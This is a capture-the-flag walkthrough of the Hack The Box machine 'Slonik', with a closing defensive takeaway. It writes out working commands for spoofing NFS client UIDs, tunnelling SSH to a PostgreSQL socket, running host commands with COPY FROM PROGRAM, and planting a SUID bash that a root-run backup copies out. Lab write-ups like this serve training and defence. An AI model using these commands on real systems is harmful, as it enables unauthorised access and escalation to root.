# Slonik — Hack The Box, Medium, Linux

**TL;DR:** NFS exports `/home` and `/var/backups` to the world with only
`root_squash`, and NFS trusts whatever UID the client claims — so becoming
"uid 1337" reads the `service` user's home and its `.psql_history`, which leaks a
PostgreSQL password. The `service` SSH account has no shell but does allow port
forwarding, and PostgreSQL listens only on a UNIX socket that grants `trust` to
`postgres` locally — so forwarding a port to that socket lands a superuser
session, and `COPY ... FROM PROGRAM` is code execution as `postgres`. Root is a
per-minute cron that `pg_basebackup`s the database directory as root while
preserving file modes: a mode-6777 `bash` left in the data dir is copied out as a
root-owned SUID shell.

*Flags redacted. Machine address generalised to `10.129.x.x`. Hostname and
service versions kept.*

---

## Three ports, and the odd one is a filesystem

`22`, `111` (rpcbind) and `2049` (NFS). An exposed NFS server is the whole
front door. `showmount` needs `nfs-common`; once installed:

```
/var/backups  *
/home         *
```

Both world-exported. Mounting from the container fails (`Operation not
permitted` — no `CAP_SYS_ADMIN`), so the move is a **userspace NFS client**
(`libnfs-utils`: `nfs-ls`, `nfs-cat`), which also happens to let you *choose your
UID* on each request.

## NFS trusts your UID

`/home` lists a single user, `service`, `drwxr-x---` and owned by uid **1337** —
unreadable as anyone else. But NFSv3 with only `root_squash` squashes *root*
and trusts every other client-supplied UID. libnfs takes it as a URL parameter:

```
nfs-ls "nfs://10.129.x.x/home/service?uid=1337&gid=1337"
```

and `/home/service` opens up. `.psql_history` is the prize — it records the
app's schema setup:

```sql
INSERT INTO users (username,password,description)
VALUES ('service','5b...c2','network access account');
```

Unsalted MD5, `service:service` out of `rockyou` in an instant. The description —
"network access account" — is the hint for what that account is *for*.

## A shell-less account that still forwards ports

`ssh service@10.129.x.x` authenticates and then immediately closes after a
banner: the account's shell is `/bin/false`. But port forwarding does not need a
shell, and that is exactly what a "network access account" is provisioned for.

PostgreSQL isn't in the port scan — it listens only on its local UNIX socket
(`.psql_history` shows `psql -U postgres` over the socket). OpenSSH can forward a
local TCP port straight to a remote UNIX socket:

```
ssh -L 25432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.x.x
psql "host=127.0.0.1 port=25432 user=postgres dbname=postgres"
```

`pg_hba.conf` grants `local all postgres trust`, so the forwarded socket
connection is **superuser**, no password.

## Superuser is code execution

A PostgreSQL superuser can run programs on the host as the `postgres` OS user:

```sql
CREATE TABLE c(l text);
COPY c FROM PROGRAM 'id';   -- runs as postgres
SELECT * FROM c;
```

`uid=115(postgres)`. `user.txt` sits in `/var/lib/postgresql`, readable here.

## The backup that copies your files as root

A root cron runs every minute:

```bash
/usr/bin/rm -rf /opt/backups/current/*
/usr/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/
/usr/bin/zip -r "/var/backups/archive-$date.zip" /opt/backups/current/
```

The instinct is to chase the `zip -r` (it dereferences symlinks) — but that is a
dead end: `pg_basebackup` **skips symlinks** in the data directory, any tablespace
makes plain-format `pg_basebackup` fail outright (it needs `-T`), and
`/opt/backups/current` is `root:755` so nothing can be planted in it directly.

The real property is quieter. `pg_basebackup` copies the data directory's
**regular files preserving their mode**, and it is running **as root**, so every
file it writes into `current/` is owned by root with the *source* file's
permission bits. The data directory `/var/lib/postgresql/14/main` is the
`postgres` user's own — writable. So:

```bash
cp /bin/bash /var/lib/postgresql/14/main/bash
chmod 6777 /var/lib/postgresql/14/main/bash
```

On the next cycle, `pg_basebackup` (root) copies it out:

```
-rwsrwsrwx 1 root root 1396520 /opt/backups/current/bash
```

A root-owned SUID+SGID shell, world-executable, in a directory `postgres` can
traverse:

```
/opt/backups/current/bash -p    →  euid=0(root)
```

`root.txt` in `/root`.

## What did not work, and the near-misses

- **The symlink reflex on `zip -r`.** Everything about the script says "make zip
  follow a symlink to a root file," and it is a trap: `pg_basebackup` never carries
  a symlink into `current/` (it skips them), and a tablespace — the only symlink it
  *would* recreate — breaks plain-format `pg_basebackup` before it writes anything,
  leaving `current/` empty. The vector is not a symlink at all; it is
  **mode preservation on a root-run copy**.
- **Reading root files over NFS.** `root_squash` maps client-uid-0 to `nobody`,
  so you can be any user *except* root — enough for `/home/service`, not enough
  for `/root`.
- **The reverse-shell reflex.** Outbound is filtered; the whole engagement runs
  inbound (NFS reads, an SSH port-forward, and `COPY FROM PROGRAM` with results
  read back through the DB).

## Defensive takeaway

Two mistakes compound. First, NFS exported to the world with only `root_squash`:
that alone hands over another user's home directory, because NFSv3 authorenticates
by client-asserted UID — the fix is a host allow-list plus `all_squash` or, better,
Kerberos (`sec=krb5`). Second, and the one that reaches root, a privileged cron
that copies a directory an unprivileged service can write into, **as root and with
modes preserved**. A backup should run as an unprivileged principal, or strip
SUID/SGID bits on the way in, and must always treat a service-owned directory as
untrusted input. Break either link and `postgres`-level access stays
`postgres`-level.
